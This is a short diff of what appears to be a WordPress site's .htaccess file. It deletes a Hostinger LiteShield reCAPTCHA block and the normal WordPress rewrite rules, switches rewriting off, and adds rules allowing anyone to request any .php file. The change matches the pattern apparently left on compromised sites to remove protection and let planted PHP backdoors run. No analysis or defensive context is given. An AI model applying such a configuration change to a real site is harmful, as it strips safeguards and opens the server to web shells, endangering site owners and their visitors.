@@ -1,15 +1,16 @@
-### HOSTINGER LITESHIELD RECAPTCHA, DO NOT REMOVE THIS LINE ###
-RewriteEngine On
-LsRecaptcha 100
-RewriteRule .* - [E=verifycaptcha:drop]
-### HOSTINGER LITESHIELD RECAPTCHA, DO NOT REMOVE THIS LINE ###
-# BEGIN WordPress
 <IfModule mod_rewrite.c>
-RewriteEngine On
-RewriteBase /
-RewriteRule ^index\.php$ - [L]
-RewriteCond %{REQUEST_FILENAME} !-f
-RewriteCond %{REQUEST_FILENAME} !-d
-RewriteRule . /index.php [L]
+    RewriteEngine Off
 </IfModule>
-# END WordPress
+<IfModule mod_authz_core.c>
+    <FilesMatch "\.php$">
+    Require all granted
+    </FilesMatch>
+</IfModule>
+<FilesMatch "\.php$">
+    Order allow,deny
+    allow from all
+</FilesMatch>
+<FilesMatch "^()$">
+Order allow,deny
+Allow from all
+</FilesMatch>
